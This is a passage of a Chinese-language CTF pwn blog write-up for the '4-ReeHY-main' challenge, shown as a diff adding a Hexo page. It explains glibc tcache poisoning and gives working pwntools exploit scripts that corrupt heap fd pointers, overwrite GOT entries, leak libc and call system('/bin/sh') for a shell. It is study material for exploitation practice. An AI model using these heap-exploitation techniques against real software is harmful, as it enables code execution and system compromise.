class="string">&#x27;system&#x27;</span>);  </span><br><span class="line"><span class="comment">#修改atoi的got地址为system的got地址  </span></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#get shell  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>
+
+
+<p>以上解法在libc2.26以前测试成功。然而，我们的目的并不只是为了获得flag。我们要更广泛的学习。在libc2.26及以后，加入了tcache机制，使得上述方案有些改变，但是基本原理还是一样。
+ </p>
+<h1 id="Libc2-26即以上的解法"><a href="#Libc2-26即以上的解法" class="headerlink" title="Libc2.26即以上的解法"></a>Libc2.26即以上的解法</h1><p>Tcache是libc2.26之后引进的一种新机制，类似于fastbin一样的东西，每条链上最多可以有 7 个 chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找</p>
+<p><strong>相比较double free，tcache机制反而使得我们的攻击变得简单</strong></p>
+<p>Tcache使用单项链表维护。tache posioning 和 fastbin attack类似，而且限制更加少，不会检查size，直接修改 tcache 中的 fd，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。tcache机制允许，将空闲的chunk以链表的形式缓存在线程各自tcache的bin中。下一次malloc时可以优先在tcache中寻找符合的chunk并提取出来。他缺少充分的安全检查，如果有机会构造内部chunk数据结构的特殊字段，我们可以有机会获得任意想要的地址。</p>
+<p>我们看看tcache关键处的源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *  </span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">tcache_entry *e = tcache-&gt;entries[tc_idx];  </span><br><span class="line">  <span class="comment">//idx防止越界  </span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);  </span><br><span class="line">  <span class="comment">//确实有块  </span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);  </span><br><span class="line">  <span class="comment">//取出第一个块  </span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;  </span><br><span class="line">  <span class="comment">//计数减少  </span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);  </span><br><span class="line">  <span class="comment">//key设置为null  </span></span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;  </span><br><span class="line">  <span class="comment">//返回chunk  </span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p><strong>其实就是取出单链表头结返回，然后设置新的头结点</strong></p>
+<p>假如我们写了这样的程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> n,<span class="type">char</span> **args)</span> &#123;  </span><br><span class="line">        <span class="type">char</span> buf0[<span class="number">20</span>] = <span class="string">&quot;hello&quot;</span>;  </span><br><span class="line">        <span class="type">char</span> *buf1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">32</span>);  </span><br><span class="line">        <span class="type">char</span> *buf2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">32</span>);  </span><br><span class="line">        <span class="type">char</span> *buf3;  </span><br><span class="line">        <span class="type">char</span> *buf4;  </span><br><span class="line">        <span class="built_in">memset</span>(buf1,<span class="string">&#x27;a&#x27;</span>,<span class="number">32</span>);  </span><br><span class="line">        <span class="built_in">memset</span>(buf2,<span class="string">&#x27;b&#x27;</span>,<span class="number">32</span>);  </span><br><span class="line">        <span class="built_in">free</span>(buf2);  </span><br><span class="line">  </span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,buf1);  </span><br><span class="line">  </span><br><span class="line">        buf3 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">32</span>);  </span><br><span class="line">        buf4 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">32</span>);  </span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,buf4);  </span><br><span class="line">  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buf0);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>Free buf2后，buf2块被放入tcache,其中，<strong>块的fd指向下一个空闲块</strong>，这里，我们只释放了一个块，如果我们再释放一个，那么buf2的fd就会指向那个块。当我们重新申请一样大小的堆时，从tcache的头取出一个块返回给用户，然后下一个空闲块成为新的头。假如我们伪造fd指向我们需要修改的地址处，那么我们再次malloc时便可以让堆指针指向那个地址处，于是我们就能修改那个地方的内容了。<br>上述的脚本为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./test&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#0x7FFFFFFFE560就是我们的目标地址  </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">32</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)  </span><br><span class="line">payload += p64(<span class="number">0x7FFFFFFFE560</span>)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(<span class="string">&#x27;hello,hacker!\n&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>
+
+<p>0x7FFFFFFFE560是存放hello字符串的位置，我们通过tcache攻击，修改了该处的内容为hello,hacker!\n<br>后面都是同样的道理，于是本题，我们的脚本为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="comment">#本方案基于tcache机制，适用于libc2.26即更高版本的环境，以下版本不适用  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line">sh = process(<span class="string">&#x27;./4-ReeHY-main&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#sh = remote(&#x27;111.198.29.45&#x27;,33297)  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome</span>():  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;seaase&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,index,content</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input size\n&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input cun\n&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Input content\n&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Chose one to dele\n&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Chose one to edit\n&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Input the content\n&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">welcome()  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#开辟两个空间  </span></span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)  </span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)  </span><br><span class="line"><span class="comment">#溢出，释放保存堆大小的数组  </span></span><br><span class="line">delete(-<span class="number">2</span>)  </span><br><span class="line"><span class="comment">#构造payload修改第二个堆的大小信息，只是信息，堆的大小并没有改变  </span></span><br><span class="line">payload = p32(<span class="number">0x80</span>) + p32(<span class="number">0x40</span>)  </span><br><span class="line">create(<span class="number">0x14</span>,<span class="number">2</span>,payload)  </span><br><span class="line"><span class="comment">#删除第二个堆  </span></span><br><span class="line">delete(<span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#构造payload覆盖第二个堆的fd指针  </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span>  </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)  </span><br><span class="line"><span class="comment">#覆盖块2的fd  </span></span><br><span class="line">payload += p64(<span class="number">0x6020e0</span>)  </span><br><span class="line">edit(<span class="number">0</span>,payload)  </span><br><span class="line"><span class="comment">#重新申请回来这个空间  </span></span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">1</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x40</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./4-ReeHY-main&#x27;</span>)  </span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]  </span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line">payload = p64(free_got) + p64(<span class="number">1</span>)  </span><br><span class="line">payload += p64(puts_got) + p64(<span class="number">1</span>)  </span><br><span class="line">payload += p64(atoi_got) + p64(<span class="number">1</span>)  </span><br><span class="line"><span class="comment">#接下来，我们申请的堆指针指向0x6020e0  </span></span><br><span class="line"><span class="comment">#那么我们可以为所欲为了  </span></span><br><span class="line"><span class="comment">#覆盖数组里的前三个堆指针分别为free_got、puts_got、atoi_got的地址  </span></span><br><span class="line"><span class="comment">#于是，堆指针0指向free,堆指针1指向puts，堆指针2指向atoi  </span></span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">3</span>,payload)  </span><br><span class="line"><span class="comment">#修改free的got地址为puts的plt地址  </span></span><br><span class="line">edit(<span class="number">0</span>,p64(puts_plt))  </span><br><span class="line"><span class="comment">#相当于puts(puts_got)  </span></span><br><span class="line"><span class="comment">#泄露puts地址  </span></span><br><span class="line">delete(<span class="number">1</span>)  </span><br><span class="line"><span class="comment">#获取puts的加载地址  </span></span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="comment">#LibcSearcher搜索数据库，查询libc版本  </span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)  </span><br><span class="line">  </span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)  </span><br><span class="line"><span class="comment">#获取system的地址  </span></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br><span class="line"><span class="comment">#修改atoi的got地址为system的地址  </span></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))  </span><br><span class="line"><span class="comment">#getshell  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/double-free/" rel="tag"># double free</a>
+              <a href="/ha1vk/tags/unlink/" rel="tag"># unlink</a>
+              <a href="/ha1vk/tags/tcache/" rel="tag"># tcache</a>
+              <a href="/ha1vk/tags/unsorted-bin/" rel="tag"># unsorted bin</a>
+              <a href="/ha1vk/tags/glibc-2-26/" rel="tag"># glibc <= 2.26</a>
+              <a href="/ha1vk/tags/glibc-2-26/" rel="tag"># glibc >= 2.26</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/10/30/pwnh9/" rel="prev" title="pwnh9">
+      <i class="fa fa-chevron-left"></i> pwnh9
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/11/06/babyfengshui/" rel="next" title="babyfengshui">
+      babyfengshui <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Libc2-26%E4%BB%A5%E4%B8%8B%E7%9A%84%E8%A7%A3%E6%B3%95"><span class="nav-number">1.</span> <span class="nav-text">Libc2.26以下的解法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Libc2-26%E5%8D%B3%E4%BB%A5%E4%B8%8A%E7%9A%84%E8%A7%A3%E6%B3%95"><span class="nav-number">2.</span> <span class="nav-text">Libc2.26即以上的解法</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
